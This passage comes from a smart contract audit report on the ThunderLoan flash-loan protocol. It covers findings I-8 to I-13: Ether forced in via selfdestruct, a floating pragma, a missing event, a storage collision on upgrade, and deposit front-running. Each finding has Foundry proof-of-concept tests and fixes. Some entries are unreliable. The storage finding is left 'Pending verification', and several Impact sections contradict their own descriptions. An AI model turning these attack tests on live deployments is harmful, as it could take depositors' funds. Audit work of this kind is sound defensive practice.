        revert ThunderLoan__NotCurrentlyFlashLoaning();
    }
    AssetToken assetToken = s_tokenToAssetToken[token];
    token.safeTransferFrom(msg.sender, address(assetToken), amount);
    emit Repayment(token, msg.sender, amount);
}
```

## [I-8]. Unexpected Eth issue in ThunderLoanUpgraded::NA

## Description
The `ThunderLoanUpgraded` contract does not implement a `receive()` or `fallback()` payable function. However, Ether can still be forcibly sent to the contract address, for example, by another contract calling `selfdestruct(payable(address(thunderLoanUpgraded)))`. Since there is no function to withdraw Ether from the contract, any Ether sent to it will be permanently stuck.

## Impact
While this does not pose a direct threat to the protocol's funds, it can result in a permanent loss of funds for users who accidentally or intentionally send Ether to the contract address. It is a best practice to provide a mechanism for fund recovery.

## Proof of Concept
1. An attacker creates a contract, `ForceSend`.
2. The attacker funds `ForceSend` with 1 ETH.
3. The attacker calls a function on `ForceSend` that executes `selfdestruct(payable(address(thunderLoanUpgraded)))`.
4. The 1 ETH is forcibly transferred to the `ThunderLoanUpgraded` contract.
5. The ETH is now locked within the `ThunderLoanUpgraded` contract forever, as no withdrawal function exists.

## Proof of Code
```solidity
// test/UnexpectedEth.t.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test} from "forge-std/Test.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {MockPoolFactory} from "./mocks/MockPoolFactory.sol";

contract ForceSend {
    constructor() payable {}

    function kill(address payable recipient) public {
        selfdestruct(recipient);
    }
}

contract UnexpectedEthTest is Test {
    ThunderLoanUpgraded internal thunderLoan;

    function setUp() public {
        MockPoolFactory poolFactory = new MockPoolFactory();
        thunderLoan = new ThunderLoanUpgraded();
        thunderLoan.initialize(address(poolFactory));
    }

    function testEthCanBeStuck() public {
        address payable thunderLoanAddress = payable(address(thunderLoan));
        assertEq(thunderLoanAddress.balance, 0);

        // Force send 1 ETH to the contract
        ForceSend sender = new ForceSend{value: 1 ether}();
        sender.kill(thunderLoanAddress);

        // The ETH is now in the contract balance but cannot be withdrawn.
        assertEq(thunderLoanAddress.balance, 1 ether);
    }
}
```

## Suggested Mitigation
Implement a function that allows the contract owner to withdraw any Ether that has been accidentally sent to the contract. A similar function for rescuing stuck ERC20 tokens is also recommended.
```solidity
// In ThunderLoanUpgraded.sol
function withdrawEther() external onlyOwner {
    uint256 balance = address(this).balance;
    (bool success, ) = owner().call{value: balance}("");
    require(success, "Transfer failed.");
}

function withdrawErc20(address tokenAddress) external onlyOwner {
    IERC20 token = IERC20(tokenAddress);
    uint256 balance = token.balanceOf(address(this));
    token.transfer(owner(), balance);
}
```

## [I-9]. Pragma issue in OracleUpgradeable::NA

## Description
All contracts in the project use a floating pragma version (`pragma solidity ^0.8.20;`). This is not a best practice as it allows the contracts to be compiled with any patch version of the compiler greater than or equal to `0.8.20` and less than `0.9.0`. A future, unreleased compiler version could introduce bugs that might affect the behavior of the contracts, potentially leading to security vulnerabilities. It is recommended to lock the pragma to a specific, audited compiler version.

## Impact
Using a floating pragma might lead to the contract being deployed with a compiler version that has unfound bugs, which could compromise the contract's security or behavior. This introduces a small but unnecessary risk.

## Proof of Concept
1. A new Solidity compiler version, e.g., `0.8.25`, is released with a subtle bug in the optimizer or code generation.
2. The project is compiled and deployed using this new version.
3. The bug in the compiler manifests in the deployed bytecode, creating a vulnerability that was not present when tested with version `0.8.20`.

## Proof of Code
// This is a best-practice violation, not a runtime vulnerability that can be demonstrated with a unit test.

## Suggested Mitigation
Lock the pragma to a specific version that has been well-tested and is considered stable. This ensures that the contract bytecode is always predictable and is not subject to unknown risks from future compiler versions.

```solidity
// Before
pragma solidity ^0.8.20;

// After
pragma solidity 0.8.20;
```

## [I-10]. Event Consistency issue in AssetToken::updateExchangeRate

## Description
The `AssetToken.updateExchangeRate` function modifies `s_exchangeRate`, which is a critical state variable that determines the value of a liquidity provider's holdings. However, this state change does not emit an event. The lack of an `ExchangeRateUpdated` event makes it difficult for off-chain services, monitoring tools, and users to track changes in the value of their investment in real-time. All critical state changes should emit events to ensure transparency and observability.

## Impact
The primary impact is a reduction in transparency and observability. It becomes harder for liquidity providers and third-party integrators to build services that monitor the performance of assets within the ThunderLoan protocol. This does not pose a direct security threat but is a significant deviation from smart contract development best practices.

## Proof of Concept
1. A user provides liquidity and receives `AssetToken`s.
2. Multiple flash loans occur, causing the `updateExchangeRate` function to be called several times, increasing the `s_exchangeRate`.
3. The user has no direct way to track these changes via on-chain events. They would need to call the `getExchangeRate()` view function periodically or deduce the change from other events, which is inefficient and less reliable.

## Proof of Code
// This is an observability issue, not a runtime vulnerability that can be demonstrated with a failing unit test.

## Suggested Mitigation
An event should be added to the `AssetToken` contract and emitted whenever the `s_exchangeRate` is modified. This will provide a clear, on-chain log of all changes to the exchange rate.

```solidity
// In AssetToken.sol

event ExchangeRateUpdated(uint256 newRate);

function updateExchangeRate(uint256 fee) external onlyThunderLoan {
    uint256 currentTotalSupply = totalSupply();
    if (currentTotalSupply == 0) {
        return;
    }
    s_exchangeRate = s_exchangeRate + (fee * EXCHANGE_RATE_PRECISION) / currentTotalSupply;
    emit ExchangeRateUpdated(s_exchangeRate);
}
```

## [I-11]. Unexpected Eth issue in ThunderLoan::NA

## Description
The `ThunderLoan` and `ThunderLoanUpgraded` contracts do not implement a `receive()` or `fallback()` payable function. If Ether is forcibly sent to the contract address (e.g., via `selfdestruct` from another contract or as a coinbase transaction), it will be locked in the contract forever, as there is no function to withdraw it.

## Impact
Ether that is forcibly transferred to the implementation address cannot be retrieved by ordinary users because the current implementation exposes no payable fallback nor withdrawal routine. The ETH is not permanently lost, however: the owner (who already possesses the ability to upgrade the implementation via UUPS) can always deploy a new version that contains a withdraw function and migrate the proxy to it. Therefore only users who accidentally send ETH to the proxy are affected until – and unless – the owner decides to recover it. The protocol’s funds and accounting remain unaffected.

## Proof of Concept
1. An attacker creates a simple contract with a payable constructor and a `destroy(address target)` function.
2. The attacker deploys this contract, sending 1 ETH to it.
3. The attacker calls `destroy(address(thunderLoan))`, triggering `selfdestruct`.
4. The 1 ETH from the attacker's contract is forcibly transferred to the `ThunderLoan` contract address.
5. The 1 ETH is now irrecoverable.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

contract SuicideContract {
    constructor() payable {}
    function destroy(address payable target) public {
        selfdestruct(target);
    }
}

contract UnexpectedEthTest is Test {
    address thunderLoan = makeAddr("thunderLoan");

    function test_CanLockEthInContract() public {
        uint256 initialBalance = thunderLoan.balance;
        assertEq(initialBalance, 0);

        // Attacker contract with 1 ETH forces ETH into the loan contract
        SuicideContract suicide = new SuicideContract{value: 1 ether}();
        suicide.destroy(payable(thunderLoan));

        uint256 finalBalance = thunderLoan.balance;
        assertEq(finalBalance, 1 ether, "ETH should be locked in the contract");
    }
}
```

## Suggested Mitigation
It is best practice for contracts to include a mechanism to recover ETH that is accidentally sent to them. Add a `receive` function and an owner-only function to withdraw any ETH balance.

```solidity
// Add to ThunderLoan.sol and ThunderLoanUpgraded.sol

receive() external payable {}

function withdrawEther() external onlyOwner {
    (bool success, ) = owner().call{value: address(this).balance}("");
    require(success, "ThunderLoan: ETH withdrawal failed");
}
```

## [I-12]. Storage Layout issue in ThunderLoanUpgraded::NA

## Description
When upgrading from `ThunderLoan` to `ThunderLoanUpgraded`, the storage layout is not compatible. The `ThunderLoanUpgraded` contract removes two state variables (`s_feePrecision` and `s_allowedTokens`) that existed in the original `ThunderLoan` contract. This causes the storage slots of subsequent state variables (`s_flashLoanFee` and `s_currentlyFlashLoaning`) to shift, leading to state corruption. For example, after the upgrade, the `s_flashLoanFee` variable in the new implementation will read from the storage slot that previously held `s_feePrecision`, and the `s_currentlyFlashLoaning` mapping will point to the slot of the `s_allowedTokens` mapping.

## Impact
Pending verification

## Proof of Concept
Pending verification

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProxyAdmin} from "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";

contract StorageLayoutTest is Test {
    ProxyAdmin internal proxyAdmin;
    address internal proxyAddress;

    address internal owner = makeAddr("owner");

    function setUp() public {
        vm.startPrank(owner);
        // 1. Deploy V1 behind a proxy
        ThunderLoan implementationV1 = new ThunderLoan();
        proxyAdmin = new ProxyAdmin();
        bytes memory data = abi.encodeWithSelector(ThunderLoan.initialize.selector, address(0));
        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(address(implementationV1), address(proxyAdmin), data);
        proxyAddress = address(proxy);
        vm.stopPrank();
    }

    function test_Upgrade_StorageCollision() public {
        ThunderLoan loanV1 = ThunderLoan(proxyAddress);

        // 2. Check initial state of V1
        uint256 feePrecisionV1 = loanV1.s_feePrecision();
        uint256 flashLoanFeeV1 = loanV1.getFee();

        assertEq(feePrecisionV1, 1e18, "V1 fee precision should be 1e18");
        assertEq(flashLoanFeeV1, 3e15, "V1 flash loan fee should be 3e15");

        // 3. Upgrade to V2
        vm.startPrank(owner);
        ThunderLoanUpgraded implementationV2 = new ThunderLoanUpgraded();
        proxyAdmin.upgrade(TransparentUpgradeableProxy(proxyAddress), address(implementationV2));
        vm.stopPrank();

        ThunderLoanUpgraded loanV2 = ThunderLoanUpgraded(proxyAddress);

        // 4. Read fee from V2. It will read from the wrong storage slot.
        uint256 flashLoanFeeV2 = loanV2.getFee();

        // 5. Assert that V2 fee is now the value of V1's feePrecision, demonstrating the storage collision.
        assertEq(flashLoanFeeV2, feePrecisionV1, "V2 flash loan fee should equal V1 fee precision due to collision");
        assertNotEq(flashLoanFeeV2, flashLoanFeeV1, "V2 flash loan fee is corrupted");

        console.log("Attack successful: Upgraded contract state is corrupted.");
        console.log("V2 Flash Loan Fee: %s", flashLoanFeeV2);
    }
}
```

## Suggested Mitigation
Pending verification

## [I-13]. Frontrun/Backrun/Sandwhich MEV issue in ThunderLoan::deposit(IERC20,uint256)

## Description
The `deposit` function is vulnerable to front-running (or sandwich) attacks. The function calculates the amount of `AssetToken`s to mint based on the current `exchangeRate`. An attacker can see a large pending deposit transaction in the mempool. The attacker can front-run this transaction by executing their own transaction (e.g., a flash loan) that generates a fee. This fee increases the `exchangeRate`. When the victim's deposit is executed, they will receive fewer `AssetToken`s than they expected for their capital, with the difference in value being captured by existing liquidity providers, including the attacker.

## Impact
The scenario describes normal fee accrual where depositors that join *after* interest is accrued do not receive a share of that past interest. No loss of principal occurs and no attacker can extract value beyond the protocol-defined fee distribution. Therefore there is no security impact.

## Proof of Concept
1. A victim prepares to deposit 1,000,000 DAI into the ThunderLoan pool. At this time, the exchange rate is 1 tDAI for 1 DAI.
2. An attacker sees the victim's transaction in the mempool.
3. The attacker front-runs the victim by taking a large flash loan of DAI from the ThunderLoan pool. This action generates a fee.
4. The `updateExchangeRate` function is called, and the tDAI exchange rate increases slightly (e.g., to 1.001).
5. The victim's transaction is now processed. They deposit 1,000,000 DAI but are minted `1,000,000 / 1.001` = `999,000.99` tDAI instead of 1,000,000 tDAI.
6. The value difference (almost 1000 DAI) is now distributed among the LPs that existed before the victim's deposit, which could include the attacker.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {AssetToken} from "../src/protocol/AssetToken.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProxyAdmin} from "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";
import {IFlashLoanReceiver} from "../src/interfaces/IFlashLoanReceiver.sol";

contract DummyReceiver is IFlashLoanReceiver {
    function executeOperation(address, uint256, uint256, address, bytes calldata) external pure returns (bool) {
        return true;
    }
}

contract FrontrunTest is Test {
    ThunderLoan internal thunderLoan;
    ProxyAdmin internal proxyAdmin;
    ERC20Mock internal dai;
    AssetToken internal tDai;

    address internal owner = makeAddr("owner");
    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    function setUp() public {
        vm.startPrank(owner);
        ThunderLoan implementation = new ThunderLoan();
        proxyAdmin = new ProxyAdmin();
        bytes memory data = abi.encodeWithSelector(ThunderLoan.initialize.selector, address(0));
        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(address(implementation), address(proxyAdmin), data);
        thunderLoan = ThunderLoan(address(proxy));
        vm.stopPrank();

        dai = new ERC20Mock();
        // Initial liquidity and token setup
        vm.startPrank(owner);
        dai.mint(owner, 1_000_000 ether);
        dai.approve(address(thunderLoan), 1_000_000 ether);
        thunderLoan.deposit(dai, 1_000_000 ether);
        vm.stopPrank();
        tDai = thunderLoan.s_tokenToAssetToken(dai);
    }

    function test_Frontrun_Deposit() public {
        uint256 victimDepositAmount = 500_000 ether;
        dai.mint(victim, victimDepositAmount);
        vm.startPrank(victim);
        dai.approve(address(thunderLoan), victimDepositAmount);
        vm.stopPrank();

        uint256 initialRate = tDai.getExchangeRate();
        uint256 expectedTokensForVictim = (victimDepositAmount * 1e18) / initialRate;

        // 1. Attacker front-runs with a flashloan to manipulate the exchange rate
        DummyReceiver receiver = new DummyReceiver();
        dai.mint(attacker, 10_000 ether); // Fee money
        vm.startPrank(attacker);
        dai.approve(address(thunderLoan), 10_000 ether);
        thunderLoan.flashloan(address(receiver), dai, 1_000_000 ether, "");
        vm.stopPrank();

        uint256 manipulatedRate = tDai.getExchangeRate();
        assertTrue(manipulatedRate > initialRate, "Rate should have increased");

        // 2. Victim's deposit transaction executes at the manipulated rate
        vm.startPrank(victim);
        uint256 initialVictimBalance = tDai.balanceOf(victim);
        thunderLoan.deposit(dai, victimDepositAmount);
        uint256 finalVictimBalance = tDai.balanceOf(victim);
        vm.stopPrank();

        uint256 actualTokensMinted = finalVictimBalance - initialVictimBalance;

        // 3. Victim received fewer tokens than expected
        assertTrue(actualTokensMinted < expectedTokensForVictim, "Victim received fewer tokens");
        console.log("Expected tDAI for victim: %s", expectedTokensForVictim);
        console.log("Actual tDAI for victim:   %s", actualTokensMinted);
        console.log("Loss for victim:          %s", expectedTokensForVictim - actualTokensMinted);
    }
}
```

## Suggested Mitigation
Introduce a slippage protection parameter to the `deposit` function. The user should be able to specify the minimum amount of asset tokens they are willing to receive (`minAmountOut`). The function should check if the calculated amount to mint is greater than or equal to this parameter, and revert otherwise.

```diff
// In ThunderLoan.sol and ThunderLoanUpgraded.sol
- function deposit(IERC20 token, uint256 amount) external {
+ function deposit(IERC20 token, uint256 amount, uint256 minAmountOut) external {
    // ...
    uint256 amountToMint = (amount * 1e18) / assetToken.getExchangeRate();
+   if (amountToMint < minAmountOut) {
+       revert ThunderLoan_Slippage();
+   }
    assetToken.mint(msg.sender, amountToMint);
    // ...
}
```



